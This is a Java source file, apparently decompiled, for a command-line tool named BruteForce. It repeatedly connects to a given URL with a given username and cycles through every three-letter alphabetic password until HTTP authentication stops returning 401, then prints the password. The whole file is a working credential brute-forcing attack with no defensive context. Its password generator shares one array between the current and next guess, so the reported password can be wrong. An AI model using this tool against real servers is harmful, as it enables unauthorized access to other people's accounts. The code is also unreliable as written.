import java.net.PasswordAuthentication;
import java.io.IOException;
import java.net.ProtocolException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.Authenticator;
public class BruteForce extends Authenticator {
    private String username;
    private URL url;
    private char[] nextPassword;
    private char[] thisPassword;
    public static void main ( final String[] array ) {
        if ( array.length != 2 ) {
            System.err.println ( "usage: BruteForce <url> <username>" );
            System.exit ( 1 );
        }
        BruteForce bruteForce = null;
        try {
            bruteForce = new BruteForce ( array[0], array[1] );
        } catch ( MalformedURLException ex ) {
            ex.printStackTrace();
            System.exit ( 1 );
        }
        bruteForce.work();
        System.exit ( 0 );
    }
    public BruteForce ( final String s, final String username ) throws MalformedURLException {
        this.url = new URL ( s );
        this.username = username;
        this.nextPassword = new char[] { 'a' };
    }
    public void work() {
        Authenticator.setDefault ( this );
        try {
            HttpURLConnection httpURLConnection = ( HttpURLConnection ) this.url.openConnection();
            httpURLConnection.connect();
            while ( httpURLConnection.getResponseCode() == 401 && this.nextPassword != null ) {
                try {
                    httpURLConnection.getInputStream();
                    httpURLConnection.connect();
                } catch ( ProtocolException ex3 ) {
                    httpURLConnection = ( HttpURLConnection ) this.url.openConnection();
                } catch ( NullPointerException ex ) {
                    ex.printStackTrace();
                    System.exit ( 1 );
                }
            }
        } catch ( IOException ex2 ) {
            ex2.printStackTrace();
            System.exit ( 1 );
        }
        System.out.println ( "password=" + new String ( this.thisPassword ) );
    }
    public PasswordAuthentication getPasswordAuthentication() {
        this.createNextPassword();
        return new PasswordAuthentication ( this.username, this.thisPassword );
    }
    public void createNextPassword() {
        if ( this.thisPassword == null ) {
            this.thisPassword = new char[] { 'A', 'A', 'A' };
            this.nextPassword = new char[] { 'A', 'A', 'B' };
            return;
        }
        this.thisPassword = this.nextPassword;
        if ( this.nextPassword[2] == 'Z' ) {
            this.nextPassword[2] = 'a';
            return;
        }
        if ( this.nextPassword[2] != 'z' ) {
            int n = this.nextPassword[2];
            this.nextPassword[2] = ( char ) ( ++n );
        } else {
            this.nextPassword[2] = 'A';
            if ( this.nextPassword[1] == 'Z' ) {
                this.nextPassword[1] = 'a';
            } else if ( this.nextPassword[1] != 'z' ) {
                int n2 = this.nextPassword[1];
                this.nextPassword[1] = ( char ) ( ++n2 );
            } else {
                this.nextPassword[1] = 'A';
                if ( this.nextPassword[0] == 'Z' ) {
                    this.nextPassword[0] = 'a';
                } else if ( this.nextPassword[0] != 'z' ) {
                    int n3 = this.nextPassword[0];
                    this.nextPassword[0] = ( char ) ( ++n3 );
                } else {
                    this.nextPassword = null;
                }
            }
        }
    }
}
